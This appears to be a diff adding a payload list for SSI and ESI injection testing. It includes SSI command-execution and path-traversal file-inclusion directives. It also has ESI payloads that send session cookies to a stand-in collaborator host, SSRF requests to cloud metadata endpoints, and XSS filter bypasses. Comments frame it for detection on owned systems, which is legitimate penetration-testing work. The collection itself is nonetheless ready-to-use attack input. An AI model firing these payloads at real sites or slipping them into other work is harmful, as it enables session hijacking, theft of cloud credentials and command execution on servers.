@@ -1,0 +1,89 @@
+# SSI and ESI Injection Payloads
+
+# SSI detection (harmless directives)
+<!--#echo var="DATE_LOCAL" -->
+<!--#echo var="DATE_GMT" -->
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="DOCUMENT_URI" -->
+<!--#echo var="LAST_MODIFIED" -->
+<!--#echo var="SERVER_SOFTWARE" -->
+<!--#echo var="REMOTE_ADDR" -->
+<!--#echo var="HTTP_USER_AGENT" -->
+<!--#echo var="QUERY_STRING" -->
+<!--#printenv -->
+<!--#config timefmt="%Y" -->
+<!--#flastmod file="index.html" -->
+<!--#fsize file="index.html" -->
+
+# SSI file inclusion
+<!--#include virtual="/index.html" -->
+<!--#include virtual="/etc/hostname" -->
+<!--#include file="index.html" -->
+<!--#include file="/etc/hostname" -->
+<!--#include virtual="../../../etc/hostname" -->
+
+# SSI command execution (only on systems you own; harmless commands)
+<!--#exec cmd="id" -->
+<!--#exec cmd="whoami" -->
+<!--#exec cmd="hostname" -->
+<!--#exec cmd="ls /" -->
+<!--#exec cgi="/cgi-bin/test.cgi" -->
+
+# SSI conditional logic (detection when output is hidden)
+<!--#if expr="$DATE_LOCAL" -->ssi-true<!--#else -->ssi-false<!--#endif -->
+<!--#set var="x" value="ssi-marker" --><!--#echo var="x" -->
+
+# SSI via encodings
+&lt;!--#echo var="DATE_LOCAL" --&gt;
+%3C!--%23echo%20var%3D%22DATE_LOCAL%22%20--%3E
+<!--#echo var="DATE_LOCAL"-->
+<!-- #echo var="DATE_LOCAL" -->
+
+# ESI detection (look for an out-of-band request from the edge or a different response)
+<esi:include src="http://oast.example.test/esi-detect"/>
+<esi:include src="http://oast.example.test/esi-detect" />
+<esi:include src="/esi-local-marker"/>
+<esi:inline name="/esi-marker" fetchable="yes"><esi:include src="http://oast.example.test/esi-inline"/></esi:inline>
+<esi:comment text="esi-comment-marker"/>
+<esi:remove>esi-remove-marker</esi:remove>
+<!--esi esi-comment-marker -->
+<esi:vars>$(HTTP_HOST)</esi:vars>
+<esi:vars>$(HTTP_USER_AGENT)</esi:vars>
+<esi:vars>$(REMOTE_ADDR)</esi:vars>
+<esi:vars>$(QUERY_STRING)</esi:vars>
+<esi:assign name="x" value="esi-marker"/><esi:vars>$(x)</esi:vars>
+<esi:try><esi:attempt><esi:include src="http://oast.example.test/esi-try"/></esi:attempt><esi:except>esi-except-marker</esi:except></esi:try>
+<esi:choose><esi:when test="1==1">esi-true</esi:when><esi:otherwise>esi-false</esi:otherwise></esi:choose>
+
+# ESI: cookie and header disclosure (HttpOnly cookies are visible to the edge, not to JavaScript)
+<esi:vars>$(HTTP_COOKIE)</esi:vars>
+<esi:vars>$(HTTP_COOKIE{session})</esi:vars>
+<esi:include src="http://oast.example.test/steal?c=$(HTTP_COOKIE)"/>
+<esi:include src="http://oast.example.test/?h=$(HTTP_HOST)&a=$(HTTP_USER_AGENT)"/>
+
+# ESI: SSRF to internal addresses from the edge
+<esi:include src="http://127.0.0.1/"/>
+<esi:include src="http://localhost:8080/"/>
+<esi:include src="http://169.254.169.254/latest/meta-data/"/>
+<esi:include src="http://metadata.google.internal/computeMetadata/v1/"/>
+<esi:include src="http://internal.example.test/"/>
+
+# ESI: XSS filter bypass (the browser never sees the tag; the edge produces the script)
+<esi:include src="http://oast.example.test/xss.html"/>
+<esi:assign name="s" value="<script>document.title='esi-xss-marker'</script>"/><esi:vars>$(s)</esi:vars>
+x<esi:vars>&lt;script&gt;document.title='esi-xss-marker'&lt;/script&gt;</esi:vars>
+
+# ESI: Akamai ESI extensions (Akamai edge only)
+<esi:include src="http://oast.example.test/akamai" dca="none"/>
+<esi:include src="http://oast.example.test/akamai-xslt" dca="xslt" stylesheet="http://oast.example.test/style.xsl"/>
+
+# ESI: Fastly / Varnish / Squid specific forms
+<esi:include src="http://oast.example.test/varnish" onerror="continue"/>
+<esi:include src="/internal-marker" alt="http://oast.example.test/alt"/>
+
+# ESI: capability headers to check in responses (identifies the engine)
+# Surrogate-Control: content="ESI/1.0"
+# Surrogate-Capability: abc="ESI/1.0"
+# Via: 1.1 varnish
+# X-Cache: HIT
+# Edge-Control: dca=esi
